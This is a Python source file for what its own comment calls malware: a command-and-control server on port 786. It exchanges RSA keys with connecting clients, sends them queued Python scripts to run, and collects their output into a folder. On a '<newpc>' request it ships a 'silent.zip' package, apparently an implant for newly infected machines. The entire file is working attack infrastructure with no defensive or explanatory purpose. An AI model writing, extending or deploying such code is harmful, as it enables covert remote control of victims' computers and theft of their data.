import os
import socket
import rsa
import FileTransfer

if __name__ == '__main__':
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 786))
    server_socket.listen()
    while (True):
        client_socket, client_ip = server_socket.accept()
        print('connection initiated')
        (public_key, private_key) = rsa.newkeys(1024)
        client_socket.send((str(public_key.n) + ':' + str(public_key.e)).encode())
        data = client_socket.recv(1024)
        encryption_key = rsa.decrypt(data, private_key)
        request = FileTransfer.decrypt(client_socket.recv(1024), encryption_key).decode()
        print(request)
        # malware needs new script
        if (request == '<newscript>'):
            scripts = os.listdir('./queue')
            filename = ''
            while (filename == '' and scripts):
                print(scripts)
                if scripts[0].endswith('.py'):
                    filename = scripts[0]
                else:
                    os.remove('./queue/' + scripts[0])
                    scripts = scripts[1:]
            print(filename)
            if filename != '':
                FileTransfer.send(client_socket, encryption_key, filename, './queue/')
                os.remove('./queue/' + filename)

            else:
                print('no scripts')
                client_socket.send(FileTransfer.encrypt('<nofile>'.encode(), encryption_key))
        elif (request == '<newoutput>'):
            data = FileTransfer.decrypt(client_socket.recv(1024), encryption_key).decode()
            print(data)
            FileTransfer.receive(client_socket, encryption_key, data, './output/')
        elif(request == '<newpc>'):
            FileTransfer.send(client_socket, encryption_key, 'silent.zip', './')
        client_socket.close()
